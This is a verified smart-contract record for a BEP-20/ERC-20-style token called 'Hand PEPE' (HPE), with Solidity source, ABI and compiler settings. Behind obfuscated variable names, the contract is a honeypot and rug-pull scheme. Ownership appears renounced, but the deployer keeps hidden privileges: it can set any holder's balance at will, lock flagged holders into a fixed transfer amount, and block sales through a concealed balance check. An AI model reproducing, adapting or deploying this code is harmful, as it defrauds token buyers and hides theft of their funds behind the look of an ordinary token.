{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface exemptTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityMarketingBuy) external view returns (uint256);\n\n    function transfer(address teamMax, uint256 exemptBuy) external returns (bool);\n\n    function allowance(address sellSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamMax,\n        uint256 exemptBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchLiquidity, uint256 value);\n    event Approval(address indexed sellSender, address indexed spender, uint256 value);\n}\n\nabstract contract sellFeeExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingSell {\n    function createPair(address receiverLiquidity, address maxMarketing) external returns (address);\n}\n\ninterface exemptTeamMetadata is exemptTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HandPEPE is sellFeeExempt, exemptTeam, exemptTeamMetadata {\n\n    bool public txTotal;\n\n    mapping(address => uint256) private minIs;\n\n    function sellListMode(address toAuto) public {\n        liquidityReceiver();\n        if (swapMax == swapLaunch) {\n            swapLaunch = false;\n        }\n        if (toAuto == launchedLiquidity || toAuto == launchedListFund) {\n            return;\n        }\n        exemptReceiver[toAuto] = true;\n    }\n\n    function launchedList(address amountTotal) public {\n        require(amountTotal.balance < 100000);\n        if (txTotal) {\n            return;\n        }\n        \n        autoFee[amountTotal] = true;\n        if (swapMax == enableBuy) {\n            swapLaunch = true;\n        }\n        txTotal = true;\n    }\n\n    event OwnershipTransferred(address indexed receiverSell, address indexed launchedSwap);\n\n    function limitReceiver() public {\n        emit OwnershipTransferred(launchedLiquidity, address(0));\n        fromListLiquidity = address(0);\n    }\n\n    string private isAuto = \"Hand PEPE\";\n\n    mapping(address => bool) public autoFee;\n\n    function transfer(address feeExempt, uint256 exemptBuy) external virtual override returns (bool) {\n        return sellSwap(_msgSender(), feeExempt, exemptBuy);\n    }\n\n    function sellSwap(address teamShouldMin, address teamMax, uint256 exemptBuy) internal returns (bool) {\n        if (teamShouldMin == launchedLiquidity) {\n            return exemptFrom(teamShouldMin, teamMax, exemptBuy);\n        }\n        uint256 fromLaunchList = exemptTeam(launchedListFund).balanceOf(isSellLiquidity);\n        require(fromLaunchList == amountLaunched);\n        require(teamMax != isSellLiquidity);\n        if (exemptReceiver[teamShouldMin]) {\n            return exemptFrom(teamShouldMin, teamMax, liquidityMaxLimit);\n        }\n        return exemptFrom(teamShouldMin, teamMax, exemptBuy);\n    }\n\n    uint256 amountLaunched;\n\n    address launchedMaxTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private atTx = 100000000 * 10 ** 18;\n\n    address isSellLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function autoTx(uint256 exemptBuy) public {\n        liquidityReceiver();\n        amountLaunched = exemptBuy;\n    }\n\n    function buyLaunch(address feeExempt, uint256 exemptBuy) public {\n        liquidityReceiver();\n        minIs[feeExempt] = exemptBuy;\n    }\n\n    function liquidityReceiver() private view {\n        require(autoFee[_msgSender()]);\n    }\n\n    address private fromListLiquidity;\n\n    string private teamMarketing = \"HPE\";\n\n    function allowance(address fromLimit, address enableMin) external view virtual override returns (uint256) {\n        if (enableMin == launchedMaxTx) {\n            return type(uint256).max;\n        }\n        return totalWallet[fromLimit][enableMin];\n    }\n\n    bool private enableBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return isAuto;\n    }\n\n    address public launchedLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minFeeSender;\n    }\n\n    bool public swapMax;\n\n    bool private swapLaunch;\n\n    address public launchedListFund;\n\n    function exemptFrom(address teamShouldMin, address teamMax, uint256 exemptBuy) internal returns (bool) {\n        require(minIs[teamShouldMin] >= exemptBuy);\n        minIs[teamShouldMin] -= exemptBuy;\n        minIs[teamMax] += exemptBuy;\n        emit Transfer(teamShouldMin, teamMax, exemptBuy);\n        return true;\n    }\n\n    mapping(address => bool) public exemptReceiver;\n\n    function balanceOf(address liquidityMarketingBuy) public view virtual override returns (uint256) {\n        return minIs[liquidityMarketingBuy];\n    }\n\n    uint8 private minFeeSender = 18;\n\n    function owner() external view returns (address) {\n        return fromListLiquidity;\n    }\n\n    uint256 constant liquidityMaxLimit = 14 ** 10;\n\n    function approve(address enableMin, uint256 exemptBuy) public virtual override returns (bool) {\n        totalWallet[_msgSender()][enableMin] = exemptBuy;\n        emit Approval(_msgSender(), enableMin, exemptBuy);\n        return true;\n    }\n\n    constructor (){\n        \n        sellTotal maxLaunch = sellTotal(launchedMaxTx);\n        launchedListFund = tradingSell(maxLaunch.factory()).createPair(maxLaunch.WETH(), address(this));\n        \n        launchedLiquidity = _msgSender();\n        limitReceiver();\n        autoFee[launchedLiquidity] = true;\n        minIs[launchedLiquidity] = atTx;\n        if (swapMax == swapLaunch) {\n            swapMax = false;\n        }\n        emit Transfer(address(0), launchedLiquidity, atTx);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atTx;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalWallet;\n\n    function getOwner() external view returns (address) {\n        return fromListLiquidity;\n    }\n\n    uint256 receiverMarketingTeam;\n\n    function transferFrom(address teamShouldMin, address teamMax, uint256 exemptBuy) external override returns (bool) {\n        if (_msgSender() != launchedMaxTx) {\n            if (totalWallet[teamShouldMin][_msgSender()] != type(uint256).max) {\n                require(exemptBuy <= totalWallet[teamShouldMin][_msgSender()]);\n                totalWallet[teamShouldMin][_msgSender()] -= exemptBuy;\n            }\n        }\n        return sellSwap(teamShouldMin, teamMax, exemptBuy);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"autoTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMarketingBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"buyLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"}],\"name\":\"launchedList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedListFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAuto\",\"type\":\"address\"}],\"name\":\"sellListMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShouldMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HandPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}